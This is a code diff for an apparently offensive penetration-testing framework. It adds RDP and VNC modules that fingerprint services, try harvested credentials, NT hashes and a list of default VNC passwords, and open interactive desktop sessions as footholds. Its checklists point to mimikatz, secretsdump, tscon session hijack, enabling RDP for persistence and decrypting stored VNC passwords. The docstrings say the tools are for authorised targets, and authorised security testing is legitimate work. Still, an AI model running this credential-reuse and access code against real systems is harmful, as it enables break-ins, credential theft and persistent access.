@@ -2480,6 +2480,67 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"MySQL: {mv.group(1).strip()}"[:140]}
         return None
 
+    # 2bc6) rdp-shell: an interactive RDP desktop session was spawned
+    if sid == "rdp-shell":
+        if "desktop → " in output:
+            mm = re.search(r"desktop → (.+)$", output, re.M)
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"RDP foothold — {mm.group(1).strip()}"[:140]}
+        return None
+
+    # 2bc5) rdp-creds: a reused/known cred authenticates over RDP (local admin → critical)
+    if sid == "rdp-creds":
+        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
+        if not hits:
+            return None
+        risk = "CRITICAL" if "local admin" in output else "HIGH"
+        return {"state": "VULNERABLE", "cve": cve, "risk": risk,
+                "summary": f"RDP creds: {'; '.join(h.strip() for h in hits[:3])}"[:140]}
+
+    # 2bc4) rdp-enum: MS12-020 / weak Standard-RDP-Security (exposed) → else info
+    if sid == "rdp-enum":
+        if re.search(r"^✗ MS12-020", output, re.M):
+            return {"state": "VULNERABLE", "cve": "CVE-2012-0002", "risk": "HIGH",
+                    "summary": "RDP MS12-020 (CVE-2012-0002) — pre-auth RCE/DoS"[:140]}
+        if re.search(r"^✗ WEAK ", output, re.M):
+            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
+                    "summary": "RDP: Standard RDP Security (no NLA) — credential MITM surface"[:140]}
+        mv = re.search(r"^· host:\s*(.+)$", output, re.M)
+        if mv:
+            return {"state": "INFO", "cve": cve, "risk": "LOW",
+                    "summary": f"RDP: {mv.group(1).strip()}"[:140]}
+        return None
+
+    # 2bc3) vnc-shell: a VNC desktop session was spawned
+    if sid == "vnc-shell":
+        if "desktop → " in output:
+            mm = re.search(r"desktop → (.+)$", output, re.M)
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"VNC foothold — {mm.group(1).strip()}"[:140]}
+        return None
+
+    # 2bc2) vnc-creds: a weak/reused VNC password worked
+    if sid == "vnc-creds":
+        if re.search(r"^✗ NOAUTH", output, re.M):
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": "VNC: open desktop, no password required"[:140]}
+        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
+        if not hits:
+            return None
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"VNC password: {'; '.join(h.strip() for h in hits[:3])}"[:140]}
+
+    # 2bc1) vnc-enum: 'None' security type = open desktop (critical) → else info
+    if sid == "vnc-enum":
+        if re.search(r"^✗ NOAUTH", output, re.M):
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": "VNC: 'None' security type — desktop open with no auth"[:140]}
+        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
+        if mv:
+            return {"state": "INFO", "cve": cve, "risk": "LOW",
+                    "summary": f"VNC: {mv.group(1).strip()}"[:140]}
+        return None
+
     # 2bd3) mongo-loot: credential-like fields dumped from collections
     if sid == "mongo-loot":
         creds = re.findall(r"^✗ CRED (.+)$", output, re.M)
@@ -3835,19 +3896,14 @@ _EXPLOIT_STEPS = {
         "Manual steps & further research",
     ],
     "rdp": [
-        "Check NLA & security layer; grab the machine/domain name (rdp-sec-check / nmap)",
-        "Known / weak / reused creds & pass-the-hash (careful with lockout)",
-        "BlueKeep CVE-2019-0708 (unpatched 7/2008R2) → RCE",
-        "Valid creds → interactive session (xfreerdp; /cert:ignore, drive redirect for transfer)",
-        "Post-access: dump creds, enable further access",
-        "Manual steps & further research",
+        ("Security layer + NLA (stdlib X.224) + NTLM machine/domain/OS (netexec); MS12-020", "rdp-enum"),
+        ("Reused / known creds & pass-the-hash (netexec rdp, lockout-aware)", "rdp-creds"),
+        ("Manual steps & further research", "rdp-next"),
     ],
     "vnc": [
-        "Connect directly — is there any auth at all?",
-        "Weak/short password → crack the VNC challenge-response",
-        "Recover stored VNC passwords elsewhere (fixed-key DES) and decrypt",
-        "Version CVE (e.g. RealVNC auth bypass) → view / control the desktop",
-        "Manual steps & further research",
+        ("RFB handshake (stdlib) → security types; 'None' = open desktop, else spray target", "vnc-enum"),
+        ("Weak/default + reused VNC password (netexec vnc, targeted)", "vnc-creds"),
+        ("Manual steps & further research", "vnc-next"),
     ],
     "ssh": [
         ("Banner + KEXINIT algos → searchsploit; libssh / Terrapin / user-enum flags", "ssh-banner"),
@@ -16829,6 +16885,480 @@ def _tool_mongo_next(ip: str, port: int, proto: str) -> str:
     return "\n".join(L)
 
 
+# ══ RDP (3389) ══ the security layer + NLA state is discoverable unauthenticated via the X.224 RDP
+# negotiation (pure stdlib); netexec rdp adds the NTLM machine/domain/OS build, and validated creds
+# open an interactive rdesktop session. BlueKeep / MS12-020 are version/nmap gated.
+_RDP_PROTO_NAMES = {0: "Standard RDP Security", 1: "TLS", 2: "CredSSP (NLA)", 8: "CredSSP-EX", 4: "RDSTLS"}
+_RDP_NEG_FAIL = {1: "SSL_REQUIRED_BY_SERVER", 2: "SSL_NOT_ALLOWED_BY_SERVER",
+                 3: "SSL_CERT_NOT_ON_SERVER", 4: "INCONSISTENT_FLAGS",
+                 5: "HYBRID_REQUIRED_BY_SERVER", 6: "SSL_WITH_USER_AUTH_REQUIRED_BY_SERVER"}
+_RDPCREDS_DEADLINE = 150
+
+
+def _rdp_negotiate(ip: str, port: int, timeout: float = 6.0) -> dict:
+    """X.224 RDP negotiation → {selected, name, nla, tls, failure}. Raises on connect failure."""
+    import socket
+    import struct
+    negreq = struct.pack("<BBHI", 0x01, 0x00, 0x0008, 0x0000000B)     # TLS|CredSSP|CredSSP-EX
+    x224 = struct.pack("<BBHHB", 0x0E, 0xE0, 0x0000, 0x0000, 0x00)
+    pkt = struct.pack(">BBH", 0x03, 0x00, 4 + len(x224) + len(negreq)) + x224 + negreq
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    try:
+        try:
+            s.connect((ip, port))
+        except OSError as exc:
+            raise RuntimeError(f"no RDP on {ip}:{port} ({exc})")
+        s.sendall(pkt)
+        hdr = _recv_exact(s, 4)
+        if len(hdr) < 4:
+            return {"selected": None, "name": "", "nla": False, "tls": False, "failure": None}
+        total = struct.unpack(">H", hdr[2:4])[0]
+        body = _recv_exact(s, max(0, total - 4))
+    finally:
+        try:
+            s.close()
+        except Exception:                                    # noqa: BLE001
+            pass
+    out = {"selected": None, "name": "", "nla": False, "tls": False, "failure": None}
+    for i in range(max(0, len(body) - 7)):                   # locate the 8-byte neg structure
+        if body[i] in (0x02, 0x03) and body[i + 2:i + 4] == b"\x08\x00":
+            code = struct.unpack("<I", body[i + 4:i + 8])[0]
+            if body[i] == 0x02:
+                out["selected"] = code
+                out["nla"] = bool(code & 0x02)
+                out["tls"] = bool(code & 0x01)
+                out["name"] = _RDP_PROTO_NAMES.get(code, f"0x{code:x}")
+            else:
+                out["failure"] = _RDP_NEG_FAIL.get(code, f"code {code}")
+                out["nla"] = code == 5                       # HYBRID_REQUIRED_BY_SERVER
+            break
+    return out
+
+
+def _rdp_nxc(ip: str, port: int, extra: list, timeout: int = 60) -> str:
+    """Run netexec rdp (+extra) → ansi-stripped output, or '' when netexec is absent."""
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+    if not nxc:
+        return ""
+    try:
+        p = subprocess.run([nxc, "rdp", ip, "--port", str(port)] + extra,
+                           capture_output=True, text=True, timeout=timeout)
+        return re.sub(r"\x1b\[[0-9;]*m", "", (p.stdout or "") + (p.stderr or ""))
+    except (OSError, subprocess.SubprocessError):
+        return ""
+
+
+def _gather_rdp_creds(ip: str) -> list:
+    """(user, secret) RDP logins rdp-creds proved for this host ('rdp on <ip>')."""
+    out = []
+    for sid, output in fetch_scripts(ip, 445, "tcp"):
+        if sid != "smb-creds":
+            continue
+        for m in re.finditer(rf"! (\S+?):(\S*) @ rdp on {re.escape(ip)}\b", output or ""):
+            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
+    return out
+
+
+def _tool_rdp_enum(ip: str, port: int, proto: str) -> str:
+    """RDP step 1 tool: read the security layer & NLA state from the X.224 negotiation (pure stdlib),
+    then netexec rdp for the NTLM machine name / domain / OS build. Flags NLA-disabled (weaker, MITM /
+    BlueKeep surface) and runs the nmap MS12-020 check. Records the service. Read-only, no login.
+    A host that doesn't speak RDP raises. Authorised targets only."""
+    neg = _rdp_negotiate(ip, port)
+    lines = []
+    host = domain = os_ = ""
+    nla = neg["nla"]
+    body = _rdp_nxc(ip, port, [])
+    if body:
+        mo = re.search(r"\[\*\]\s*(.+?)\s*\(name:([^)]*)\)\s*\(domain:([^)]*)\)(?:\s*\(nla:(\w+)\))?", body)
+        if mo:
+            os_, host, domain = mo.group(1).strip(), mo.group(2).strip(), mo.group(3).strip()
+            if mo.group(4):
+                nla = mo.group(4).lower() == "true"
+    if host or domain:
+        save_services(ip, [{"port": port, "proto": proto, "name": "rdp",
+                            "product": os_ or "RDP", "version": ""}])
+    layer = neg["name"] or (neg["failure"] or "unknown")
+    lines.append(f"[*] Service: RDP · {layer}" + (f" · NLA {'on' if nla else 'OFF'}" if neg["selected"] is not None or neg["failure"] else ""))
+    if host or domain or os_:
+        lines.append(f"· host: {host or '?'} · domain: {domain or '?'} · os: {os_ or '?'}")
+    if not nla and (neg["selected"] == 0 or neg["name"] == "Standard RDP Security"):
+        lines.append("✗ WEAK Standard RDP Security (no NLA) — credential MITM & BlueKeep surface")
+    elif not nla:
+        lines.append("· NLA appears disabled — pre-auth RDP surface (CVE-2019-0708 if Win7/2008R2)")
+
+    if shutil.which("nmap"):
+        p = subprocess.run(["nmap", "-Pn", "-p", str(port), "--script", "rdp-vuln-ms12-020", ip],
+                           capture_output=True, text=True, timeout=120)
+        if re.search(r"VULNERABLE", p.stdout or ""):
+            lines.append("✗ MS12-020 VULNERABLE (CVE-2012-0002 / CVE-2012-0152) — pre-auth RCE/DoS")
+    lines.append("· prove creds (rdp-creds r2) — reuse AD/local creds; careful with lockout")
+    return f"RDP enum — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_rdp_creds(ip: str, port: int, proto: str) -> str:
+    """RDP step 2 tool: validate every harvested credential / NT hash (reuse across the estate) against
+    RDP via netexec rdp — each secret is the account's own, tried once, so no lockout spray. Confirmed
+    logins (and local-admin 'Pwn3d!') are saved ('rdp on <host>'). No netexec → raises. Authorised only."""
+    if not (shutil.which("netexec") or shutil.which("nxc")):
+        raise RuntimeError("netexec (nxc) required to validate RDP credentials")
+    creds = _gather_all_smb_creds()
+    if not creds:
+        raise RuntimeError("no harvested creds to try — run the SMB/AD phase (or add creds) first")
+
+    valid, deadline = [], time.time() + _RDPCREDS_DEADLINE
+    for dom, user, secret in creds[:40]:
+        if time.time() > deadline:
+            break
+        auth = ["-u", user, "-H", secret] if re.fullmatch(r"[a-fA-F0-9]{32}", secret or "") else ["-u", user, "-p", secret]
+        if dom and not _looks_ip(dom):
+            auth += ["-d", dom]
+        out = _rdp_nxc(ip, port, auth, timeout=40)
+        if re.search(r"\bRDP\b.*\[\+\]", out):
+            admin = "Pwn3d!" in out or "(admin)" in out.lower()
+            valid.append((user, secret, admin))
+
+    if valid:
+        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
+        for user, secret, _a in valid:
+            line = f"! {user}:{secret or '<blank>'} @ rdp on {ip} [{ip}]"
+            blocks.setdefault(ip, [])
+            if line not in blocks[ip]:
+                blocks[ip].append(line)
+        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)
+
+    lines = [f"[*] {min(len(creds), 40)} cred(s) tried · {len(valid)} valid on RDP"]
+    for user, secret, admin in valid:
+        tag = "  (local admin)" if admin else ""
+        show = secret if not re.fullmatch(r"[a-fA-F0-9]{32}", secret or "") else f"{secret[:8]}… (NT hash)"
+        lines.append(f"✗ CREDS {user}:{show}{tag}")
+    lines.append("· spawn a desktop: Privilege Escalation phase → spawn-shell (r1)" if valid
+                 else "· none valid — recover a cred first (SMB loot / roast / spray)")
+    return f"RDP credentials — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_rdp_shell(ip: str, port: int, proto: str) -> str:
+    """RDP foothold (INTERACTIVE): open an rdesktop session in a new terminal with a proven cred.
+    Headless prints the command. NT-hash-only creds need xfreerdp (restricted-admin PtH) — noted.
+    Authorised targets only."""
+    creds = _gather_rdp_creds(ip) or [(u, s) for _d, u, s in _gather_all_smb_creds()
+                                      if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s)]
+    if not creds:
+        print(f"\n{YELLOW}no proven RDP cred{RESET} — run {BOLD}rdp-creds (r2){RESET} first.")
+        return "rdp-shell: no cred"
+    user, secret = creds[0]
+    dom = _smb_cred_domain(user, secret)
+    if re.fullmatch(r"[a-fA-F0-9]{32}", secret or ""):
+        print(f"{YELLOW}NT-hash cred{RESET} — rdesktop can't PtH. Use "
+              f"{BOLD}xfreerdp /u:{user} /pth:{secret} /v:{ip}:{port} /cert:ignore{RESET}")
+        return f"rdp-shell: hash-only — xfreerdp /pth for {user}"
+    exe = shutil.which("xfreerdp")
+    if exe:
+        cmd = f"xfreerdp /u:{user} /p:'{secret}' /v:{ip}:{port} /cert:ignore +clipboard /dynamic-resolution"
+        cmd += f" /d:{dom}" if dom else ""
+    else:
+        cmd = f"rdesktop -u {user} -p '{secret}' " + (f"-d {dom} " if dom else "") + f"{ip}:{port}"
+    used = _open_shell_terminal(cmd)
+    if not used:
+        print(f"{YELLOW}headless{RESET} — run:\n  {BOLD}{cmd}{RESET}")
+        return f"rdp-shell: headless — {cmd}"
+    print(f"{GREEN}▶ RDP session opening{RESET} {DIM}({used}) as {user}{RESET}")
+    return f"rdp-shell: desktop → {ip}:{port} as {user}"
+
+
+def _tool_rdp_next(ip: str, port: int, proto: str) -> str:
+    """RDP step-3 tool: NOT a scan — a read-only checklist (BlueKeep/MS12-020, NLA, cred reuse & PtH,
+    post-access looting), with this host's findings substituted in. Pure DB synthesis; no network."""
+    scripts = fetch_scripts(ip, port, proto)
+    by_sid = {}
+    for sid, out in scripts:
+        by_sid.setdefault(sid, out or "")
+    enum = by_sid.get("rdp-enum", "")
+    mo = re.search(r"os:\s*([^\n·]+)", enum)
+    os_ = mo.group(1).strip() if mo else ""
+    creds = _gather_rdp_creds(ip)
+    nla_off = "no NLA" in enum or "NLA OFF" in enum or "NLA appears disabled" in enum
+
+    kev = _load_kev()
+    found = set()
+    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
+        if p == port and pr == proto and cv:
+            found |= {c.strip() for c in cv.split(",") if c.strip()}
+    for _sid, out in scripts:
+        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
+    found = sorted(found, key=_cve_sort_key)
+    warns = []
+    for sid, out in scripts:
+        for ln in (out or "").splitlines():
+            if ln.strip().startswith("⚠"):
+                warns.append(f"{DIM}[{sid}]{RESET} {ln.strip()}")
+
+    L = [f"RDP {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}",
+         f"{DIM}os: {os_ or 'unknown'}  ·  creds: {len(creds)}  ·  NLA: {'off' if nla_off else 'on/unknown'}{RESET}"]
+
+    L.append(f"\n{BOLD}A. Get a session{RESET}")
+    if creds:
+        L.append(f"  {CYAN}cred{RESET} {DIM}→ Privilege Escalation phase → spawn-shell (r1); or xfreerdp "
+                 f"/u:.. /p:.. /v:{ip}:{port} /cert:ignore +clipboard /drive:share,/tmp for transfer{RESET}")
+    else:
+        L.append(f"  {DIM}reuse AD/local creds (SMB spray / roast) → rdp-creds (r2); restricted-admin PtH "
+                 f"with xfreerdp /pth:<NThash>{RESET}")
+
+    L.append(f"\n{BOLD}B. Pre-auth CVEs{RESET}")
+    L.append(f"  {DIM}BlueKeep CVE-2019-0708 (Win7/2008R2, NLA off) → RCE (metasploit, unstable); "
+             f"MS12-020 CVE-2012-0002 → RCE/DoS; check the enum flags above{RESET}")
+
+    L.append(f"\n{BOLD}C. Post-access{RESET}")
+    L.append(f"  {DIM}mimikatz / secretsdump for creds; enable RDP for persistence; "
+             f"session hijack (tscon) as SYSTEM; scrape the clipboard & mapped drives{RESET}")
+
+    L.append(f"\n{BOLD}D. CVEs surfaced in this phase{RESET}")
+    if found:
+        for c in found:
+            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
+            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
+    else:
+        L.append(f"  {DIM}none surfaced — searchsploit '{os_ or 'Windows'} RDP'{RESET}")
+
+    L.append(f"\n{BOLD}E. Verify unconfirmed findings from this phase{RESET}")
+    for w in warns[:14]:
+        L.append(f"  {w}")
+    if not warns:
+        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")
+    return "\n".join(L)
+
+
+# ══ VNC (5900-5903) ══ the RFB handshake advertises the security types unauthenticated (pure stdlib),
+# so a "None" type = a wide-open desktop; VNC Auth = a single (8-char, DES) password to spray. netexec
+# vnc validates passwords; vncviewer opens the desktop. RealVNC auth-bypass (CVE-2006-2369) is nmap-gated.
+_VNC_SECTYPES = {0: "Invalid", 1: "None (NO AUTH)", 2: "VNC Auth", 5: "RA2", 6: "RA2ne",
+                 16: "Tight", 18: "TLS", 19: "VeNCrypt", 30: "Apple ARD", 35: "UltraVNC MS-Logon II"}
+_VNC_DEFAULTS = ["password", "vnc", "123456", "admin", "root", "secret", "12345678",
+                 "letmein", "test", "vncpass", "changeme", "raspberry"]
+
+
+def _vnc_handshake(ip: str, port: int, timeout: float = 6.0) -> dict:
+    """RFB handshake → {version, types, none_auth, error}. Read-only; raises on connect failure."""
+    import socket
+    import struct
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    try:
+        try:
+            s.connect((ip, port))
+        except OSError as exc:
+            raise RuntimeError(f"no VNC on {ip}:{port} ({exc})")
+        greeting = _recv_exact(s, 12)
+        mv = re.match(rb"RFB (\d{3})\.(\d{3})", greeting or b"")
+        if not mv:
+            return {"version": "", "types": [], "none_auth": False, "error": "not RFB"}
+        major, minor = int(mv.group(1)), int(mv.group(2))
+        version = f"{major}.{minor}"
+        s.sendall(b"RFB 003.008\n" if minor >= 8 else greeting)
+        types, error = [], ""
+        if minor >= 7:
+            nb = _recv_exact(s, 1)
+            n = nb[0] if nb else 0
+            if n == 0:
+                rl = _recv_exact(s, 4)
+                reason = _recv_exact(s, struct.unpack(">I", rl)[0]) if len(rl) == 4 else b""
+                error = reason.decode("latin-1", "replace").strip()
+            else:
+                types = list(_recv_exact(s, n))
+        else:
+            st = _recv_exact(s, 4)
+            if len(st) == 4:
+                types = [struct.unpack(">I", st)[0]]
+        return {"version": version, "types": types, "none_auth": 1 in types, "error": error}
+    finally:
+        try:
+            s.close()
+        except Exception:                                    # noqa: BLE001
+            pass
+
+
+def _vnc_nxc(ip: str, port: int, extra: list, timeout: int = 40) -> str:
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+    if not nxc:
+        return ""
+    try:
+        p = subprocess.run([nxc, "vnc", ip, "--port", str(port)] + extra,
+                           capture_output=True, text=True, timeout=timeout)
+        return re.sub(r"\x1b\[[0-9;]*m", "", (p.stdout or "") + (p.stderr or ""))
+    except (OSError, subprocess.SubprocessError):
+        return ""
+
+
+def _gather_vnc_creds(ip: str) -> list:
+    """VNC passwords vnc-creds proved for this host ('vnc on <ip>')."""
+    out = []
+    for sid, output in fetch_scripts(ip, 445, "tcp"):
+        if sid != "smb-creds":
+            continue
+        for m in re.finditer(rf"! vnc:(\S*) @ vnc on {re.escape(ip)}\b", output or ""):
+            out.append("" if m.group(1) == "<blank>" else m.group(1))
+    return out
+
+
+def _tool_vnc_enum(ip: str, port: int, proto: str) -> str:
+    """VNC step 1 tool: read the RFB protocol version and advertised security types (pure stdlib). A
+    'None' security type means the desktop is open with NO authentication (critical); 'VNC Auth' means
+    a single password to spray. Records the service, notes the RealVNC auth-bypass (CVE-2006-2369)
+    surface. Read-only. A host that doesn't speak RFB raises. Authorised targets only."""
+    hs = _vnc_handshake(ip, port)
+    if hs.get("error") == "not RFB":
+        raise RuntimeError(f"{ip}:{port} — not an RFB/VNC service")
+    version, types = hs["version"], hs["types"]
+    save_services(ip, [{"port": port, "proto": proto, "name": "vnc",
+                        "product": "VNC (RFB)", "version": version}])
+    names = ", ".join(_VNC_SECTYPES.get(t, f"type {t}") for t in types) or "none advertised"
+    lines = [f"[*] Service: VNC · RFB {version}", f"· security types: {names}"]
+    if hs["none_auth"]:
+        lines.append("✗ NOAUTH — 'None' security type → the desktop is open with no password!")
+    elif hs.get("error"):
+        lines.append(f"· server refused: {hs['error']} (IP allow-list? too many connections?)")
+    if any(t in (5, 6) for t in types):
+        lines.append("· RA2/RA2ne (RealVNC) — check the auth-bypass CVE-2006-2369 (vnc-next)")
+    body = _vnc_nxc(ip, port, [])
+    mt = re.search(r"\(name:([^)]*)\)|\bscreen\b.*", body)
+    if body and "VNC" in body:
+        mo = re.search(r"VNC\s+\S+\s+\d+\s+(\S+)", body)
+        if mo:
+            lines.append(f"· netexec: {mo.group(1)}")
+    lines.append("· spray the VNC password (vnc-creds r2)" if not hs["none_auth"]
+                 else "· connect straight in: spawn-shell (r1) → vncviewer")
+    return f"VNC enum — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_vnc_creds(ip: str, port: int, proto: str) -> str:
+    """VNC step 2 tool: VNC has a single (8-char, DES-truncated) password and no username. Try a curated
+    set of default/weak passwords plus any harvested password via netexec vnc — targeted, not a full
+    brute. A valid password is saved ('vnc on <host>'). No netexec → raises. Authorised targets only."""
+    if not (shutil.which("netexec") or shutil.which("nxc")):
+        raise RuntimeError("netexec (nxc) required to validate VNC passwords")
+    if _vnc_handshake(ip, port).get("none_auth"):
+        return (f"VNC credentials — {ip}:{port}\n\n"
+                "✗ NOAUTH — no password required (connect directly: spawn-shell r1)")
+    reused = [s for _d, _u, s in _gather_all_smb_creds()
+              if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s)]
+    cands, seen = [], set()
+    for pw in _VNC_DEFAULTS + reused:
+        pw8 = pw[:8]                                          # VNC truncates to 8 chars
+        if pw8 and pw8 not in seen:
+            seen.add(pw8)
+            cands.append(pw8)
+
+    valid = []
+    for pw in cands[:40]:
+        out = _vnc_nxc(ip, port, ["-p", pw])
+        if re.search(r"\bVNC\b.*\[\+\]", out):
+            valid.append(pw)
+            break
+
+    if valid:
+        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
+        for pw in valid:
+            line = f"! vnc:{pw or '<blank>'} @ vnc on {ip} [{ip}]"
+            blocks.setdefault(ip, [])
+            if line not in blocks[ip]:
+                blocks[ip].append(line)
+        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)
+
+    lines = [f"[*] {len(cands)} password(s) tried · {len(valid)} valid"]
+    for pw in valid:
+        lines.append(f"✗ CREDS vnc:{pw}")
+    lines.append("· connect: spawn-shell (r1) → vncviewer" if valid
+                 else "· no default/reused password worked — recover a stored VNC password (fixed-key DES, vnc-next)")
+    return f"VNC credentials — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_vnc_shell(ip: str, port: int, proto: str) -> str:
+    """VNC foothold (INTERACTIVE): open vncviewer to the desktop in a new terminal (no-auth or with a
+    proven password). Headless prints the command. Authorised targets only."""
+    hs = _vnc_handshake(ip, port)
+    creds = _gather_vnc_creds(ip)
+    if not hs.get("none_auth") and not creds:
+        print(f"\n{YELLOW}VNC needs a password{RESET} — run {BOLD}vnc-creds (r2){RESET} first.")
+        return "vnc-shell: no access"
+    exe = shutil.which("vncviewer") or "vncviewer"
+    cmd = f"{exe} {ip}::{port}"
+    pw = creds[0] if creds else ""
+    if pw:
+        print(f"{DIM}enter the VNC password when prompted:{RESET} {BOLD}{pw}{RESET}")
+    used = _open_shell_terminal(cmd)
+    if not used:
+        print(f"{YELLOW}headless{RESET} — run:\n  {BOLD}{cmd}{RESET}"
+              + (f"  {DIM}(password: {pw}){RESET}" if pw else ""))
+        return f"vnc-shell: headless — {cmd}"
+    print(f"{GREEN}▶ VNC desktop opening{RESET} {DIM}({used}){RESET}")
+    return f"vnc-shell: desktop → {ip}:{port}"
+
+
+def _tool_vnc_next(ip: str, port: int, proto: str) -> str:
+    """VNC step-3 tool: NOT a scan — a read-only checklist (no-auth connect, crack the challenge, stored
+    fixed-key-DES password recovery, RealVNC bypass), with this host's findings substituted in. Pure DB
+    synthesis; no network."""
+    scripts = fetch_scripts(ip, port, proto)
+    by_sid = {}
+    for sid, out in scripts:
+        by_sid.setdefault(sid, out or "")
+    enum = by_sid.get("vnc-enum", "")
+    mv = re.search(r"RFB (\S+)", enum)
+    ver = mv.group(1) if mv else ""
+    noauth = "✗ NOAUTH" in enum
+    creds = _gather_vnc_creds(ip)
+
+    kev = _load_kev()
+    found = set()
+    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
+        if p == port and pr == proto and cv:
+            found |= {c.strip() for c in cv.split(",") if c.strip()}
+    for _sid, out in scripts:
+        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
+    found = sorted(found, key=_cve_sort_key)
+    warns = []
+    for sid, out in scripts:
+        for ln in (out or "").splitlines():
+            if ln.strip().startswith("⚠"):
+                warns.append(f"{DIM}[{sid}]{RESET} {ln.strip()}")
+
+    L = [f"VNC {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}",
+         f"{DIM}RFB: {ver or 'unknown'}  ·  no-auth: {'yes' if noauth else 'no'}  ·  creds: {len(creds)}{RESET}"]
+
+    L.append(f"\n{BOLD}A. Get the desktop{RESET}")
+    if noauth or creds:
+        L.append(f"  {CYAN}ready{RESET} {DIM}→ spawn-shell (r1) → vncviewer {ip}::{port}"
+                 + (f" (password: {creds[0]})" if creds else "") + f"{RESET}")
+    else:
+        L.append(f"  {DIM}crack the VNC challenge — vncrack / hydra vnc, or netexec (vnc-creds r2); "
+                 f"password is truncated to 8 chars{RESET}")
+
+    L.append(f"\n{BOLD}B. Recover stored VNC passwords{RESET}")
+    L.append(f"  {DIM}VNC stores the password with a FIXED DES key — pull it from the box "
+             f"(~/.vnc/passwd, registry HKLM\\..\\WinVNC, *.vnc) and decrypt with vncpwd / the fixed key{RESET}")
+
+    L.append(f"\n{BOLD}C. Version CVEs{RESET}")
+    if found:
+        for c in found:
+            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
+            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
+    else:
+        L.append(f"  {DIM}RealVNC auth-bypass CVE-2006-2369 (nmap realvnc-auth-bypass); "
+                 f"searchsploit '{ver or 'VNC'}'{RESET}")
+
+    L.append(f"\n{BOLD}D. After you're on the desktop{RESET}")
+    L.append(f"  {DIM}open a terminal in the GUI → shell; loot the clipboard, browser sessions, and any "
+             f"open apps; note whether it's a view-only or full-control session{RESET}")
+
+    L.append(f"\n{BOLD}E. Verify unconfirmed findings from this phase{RESET}")
+    for w in warns[:14]:
+        L.append(f"  {w}")
+    if not warns:
+        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")
+    return "\n".join(L)
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -16882,6 +17412,13 @@ def _spawn_shell_paths(ip: str) -> list:
     for p, pr in by_key.get("ssh", []):
         if _gather_ssh_creds(ip):
             paths.append(("SSH", "direct interactive session (proven cred)", "ssh-shell", p, pr))
+    for p, pr in by_key.get("rdp", []):
+        if _gather_rdp_creds(ip):
+            paths.append(("RDP", "interactive desktop session (proven cred)", "rdp-shell", p, pr))
+    for p, pr in by_key.get("vnc", []):
+        noauth = "✗ NOAUTH" in next((o for s, o in fetch_scripts(ip, p, pr) if s == "vnc-enum"), "")
+        if noauth or _gather_vnc_creds(ip):
+            paths.append(("VNC", "desktop session (no-auth / proven password)", "vnc-shell", p, pr))
     return paths
 
 
@@ -17015,6 +17552,14 @@ _STEP_TOOLS = {
     "mongo-auth": ("MongoDB default/reused creds (nmap mongodb-brute, no lockout)", _tool_mongo_auth),
     "mongo-loot": ("MongoDB loot → walk DBs/collections, dump docs for creds (unauth)", _tool_mongo_loot),
     "mongo-next": ("manual MongoDB steps (context-aware, reference only)", _tool_mongo_next),
+    "rdp-enum": ("RDP security layer + NLA (stdlib X.224) + NTLM info (netexec rdp)", _tool_rdp_enum),
+    "rdp-creds": ("RDP cred/hash validation & reuse (netexec rdp, lockout-aware)", _tool_rdp_creds),
+    "rdp-shell": ("RDP foothold → interactive rdesktop/xfreerdp session (spawned)", _tool_rdp_shell),
+    "rdp-next": ("manual RDP steps (context-aware, reference only)", _tool_rdp_next),
+    "vnc-enum": ("VNC RFB handshake → security types + no-auth flag (stdlib)", _tool_vnc_enum),
+    "vnc-creds": ("VNC default/reused password check (netexec vnc, targeted)", _tool_vnc_creds),
+    "vnc-shell": ("VNC foothold → vncviewer desktop session (spawned)", _tool_vnc_shell),
+    "vnc-next": ("manual VNC steps (context-aware, reference only)", _tool_vnc_next),
     "mssql-banner": ("MSSQL fingerprint — SQL Browser 1434 / TDS pre-login → version (stdlib)", _tool_mssql_banner),
     "mssql-creds": ("sa blank/default + reused creds (netexec mssql, flags sysadmin)", _tool_mssql_creds),
     "mssql-exec": ("xp_cmdshell command exec confirm (netexec -x, sysadmin)", _tool_mssql_exec),
@@ -17141,6 +17686,14 @@ _STEP_TOOL_RUNS = {
     "mongo-auth":       ("nmap mongodb-brute", None),
